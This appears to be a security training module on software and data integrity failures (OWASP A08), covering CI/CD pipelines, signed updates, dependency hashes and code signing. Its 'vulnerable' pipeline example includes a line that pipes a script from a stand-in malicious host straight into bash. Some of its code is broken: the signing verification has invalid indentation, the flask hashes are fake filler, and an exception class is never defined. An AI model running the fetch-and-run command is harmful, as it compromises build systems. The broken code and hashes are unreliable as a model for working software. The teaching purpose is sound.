# A08 - Software and Data Integrity Failures

## 📋 Overview

**Software and Data Integrity Failures** relate to code and infrastructure that does not protect against integrity violations. This includes insecure CI/CD pipelines, auto-update functionality, and untrusted sources.

### 🎯 Learning Objectives

- Understand software supply chain security
- Implement secure CI/CD pipelines
- Verify software integrity
- Protect against malicious updates
- Secure dependency management

## 🚨 Common Integrity Failures

### 1. Insecure CI/CD Pipeline

**Vulnerable Example**:
```yaml
# ❌ Insecure CI/CD pipeline
name: Deploy
on: push
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - run: curl -s http://malicious.com/script.sh | bash
      - run: npm install
      - run: npm run build
      - run: aws s3 sync ./build s3://mybucket
```

**Secure Example**:
```yaml
# ✅ Secure CI/CD pipeline
name: Deploy
on: 
  push:
    branches: [main]
jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write
    steps:
      - uses: actions/checkout@v3
        with:
          token: ${{ secrets.GITHUB_TOKEN }}
      
      - name: Verify checksums
        run: sha256sum -c checksums.txt
      
      - name: Install dependencies
        run: npm ci --only=production
      
      - name: Run security scan
        run: npm audit --audit-level high
      
      - name: Build application
        run: npm run build
      
      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v2
        with:
          role-to-assume: ${{ secrets.AWS_ROLE_ARN }}
          aws-region: us-east-1
      
      - name: Deploy to S3
        run: aws s3 sync ./build s3://mybucket --delete
```

### 2. Unsigned Software Updates

**Vulnerable Example**:
```python
# ❌ Insecure auto-update
import requests

def check_for_updates():
    response = requests.get('http://updates.example.com/latest')
    if response.status_code == 200:
        update_data = response.json()
        download_and_install(update_data['download_url'])
```

**Secure Example**:
```python
# ✅ Secure update with signature verification
import requests
import hashlib
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding

class SecureUpdater:
    def __init__(self, public_key_path):
        with open(public_key_path, 'rb') as f:
            self.public_key = serialization.load_pem_public_key(f.read())
    
    def verify_signature(self, data, signature):
        try:
            self.public_key.verify(
                signature,
                data,
                padding.PSS(
                    mgf=padding.MGF1(hashes.SHA256()),
                    salt_length=padding.PSS.MAX_LENGTH
                ),
                hashes.SHA256()
            )
            return True
        except Exception:
            return False
    
    def check_for_updates(self):
        response = requests.get('https://updates.example.com/latest')
        if response.status_code == 200:
            update_data = response.json()
            
            # Verify signature
            signature = bytes.fromhex(update_data['signature'])
            if not self.verify_signature(update_data['content'].encode(), signature):
                raise SecurityError("Invalid update signature")
            
            # Verify checksum
            expected_hash = update_data['sha256']
            actual_hash = hashlib.sha256(update_data['content'].encode()).hexdigest()
            if expected_hash != actual_hash:
                raise SecurityError("Checksum mismatch")
        
        return update_data
```

## 🛠️ Lab Exercise: Supply Chain Attack

### Scenario
Analyze a system vulnerable to supply chain attacks.

### Your Task
1. Identify unsigned components
2. Test malicious package injection
3. Analyze CI/CD security
4. Propose integrity controls

### Lab Environment
- **URL**: `/labs/A08`
- **Focus**: Package integrity, update mechanisms

## 🔧 Integrity Protection Strategies

### 1. Dependency Verification

```python
# requirements.txt with hashes
requests==2.28.1 \
    --hash=sha256:7c5599b102feddaa661c826c56ab4fee28bfd17f5abca1ebbe3e7f19d7c97ddf \
    --hash=sha256:8fefa2a1a1365bf5520aac41836fbee479da67864514bdb821f31ce07ce65349

flask==2.2.2 \
    --hash=sha256:b9c46cc36662a7949f464d00d4d6a7c3c7d8b8e8c5e8b8c8c8c8c8c8c8c8c8c8 \
    --hash=sha256:a9c46cc36662a7949f464d00d4d6a7c3c7d8b8e8c5e8b8c8c8c8c8c8c8c8c8c8
```

### 2. Code Signing

```python
import hashlib
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding

class CodeSigner:
    def __init__(self):
        self.private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048
        )
        self.public_key = self.private_key.public_key()
    
    def sign_code(self, code_content):
        # Create hash of code
        code_hash = hashlib.sha256(code_content.encode()).digest()
        
        # Sign the hash
        signature = self.private_key.sign(
            code_hash,
            padding.PSS(
                mgf=padding.MGF1(hashes.SHA256()),
                salt_length=padding.PSS.MAX_LENGTH
            ),
            hashes.SHA256()
        )
        
        return signature
    
    def verify_code(self, code_content, signature):
        code_hash = hashlib.sha256(code_content.encode()).digest()
        
        try:
            self.public_key.verify(
                signature,
                code_hash,
                padding.PSS(
                    mgf=padding.MGF1(hashes.SHA256()),
                    salt_length=padding.PSS.MAX_LENGTH
                ),
                hashes.SHA256()
            )
                return True
        except Exception:
        return False
```

## ✅ Security Checklist

### Supply Chain Security
-  Verify all dependencies with checksums
-  Use signed packages when available
-  Implement dependency scanning
-  Monitor for known vulnerabilities
-  Use private package repositories

### CI/CD Security
-  Secure build environments
-  Implement code signing
-  Use least privilege access
-  Audit pipeline configurations
-  Implement approval workflows

---

**🎯 Next Steps**: Proceed to [A09 - Security Logging and Monitoring Failures](A09-Security-Logging-Monitoring-Failures.md).